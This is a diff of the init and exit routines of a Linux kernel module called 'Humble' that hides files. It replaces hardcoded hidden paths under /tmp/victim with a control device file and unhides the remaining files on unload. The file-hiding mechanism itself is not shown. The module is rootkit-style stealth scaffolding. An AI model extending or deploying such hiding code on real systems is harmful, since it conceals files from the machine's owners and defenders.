@@ -1,54 +1,24 @@
-#include <linux/types.h>
-#include <linux/module.h>
-
 #include "humble.h"
-
-#define FILE_COUNT 3
-static u64 g_inode[FILE_COUNT];
-static char g_victim[FILE_COUNT][42] = {
-	"/tmp/victim/example1",
-	"/tmp/victim/example2",
-	"/tmp/victim"
-};
 
 static int __init humble_init(void)
 {
-	int err;
-	int i;
-	printk(KERN_INFO "Humble: loaded");
+	int err = 0;
 
-	for (i = 0; i < FILE_COUNT; ++i) {
-		err = humble_hide_file(g_victim[i], &g_inode[i]);
-		if (err) {
-			printk(KERN_ALERT "Humble: could not hide file %s\n",
-				g_victim[i]);
-			goto out;
-		}
+	PRinfo("Loading");
+	err = humble_devfile_startup_once();
+	if (err) {
+		PRcritical("Could not create a control device file\n");
 	}
-out:
 	return err;
 }
 
 static void __exit humble_exit(void)
 {
-	int err;
-#if 0
-	err = humble_hash_clear();
-	if (err) {
-		printk(KERN_ALERT "Humble: could not unhide files\n");
+	if (humble_hash_clear()) {
+		PRcritical("Could not unhide remaining files\n");
 	}
-#endif
-	int i;
-	for (i = 0; i < FILE_COUNT; ++i) {
-		err = humble_hash_remove(g_inode[i]);
-		if (err) {
-			printk(KERN_ALERT
-				"Humble: could not unhide files: %d\n",
-				err);
-			break;
-		}
-	}
-	printk(KERN_INFO "Humble: unloaded");
+	humble_devfile_cleanup_once();
+	PRinfo("Unloaded");
 }
 
 MODULE_AUTHOR("Alex Lozovsky");
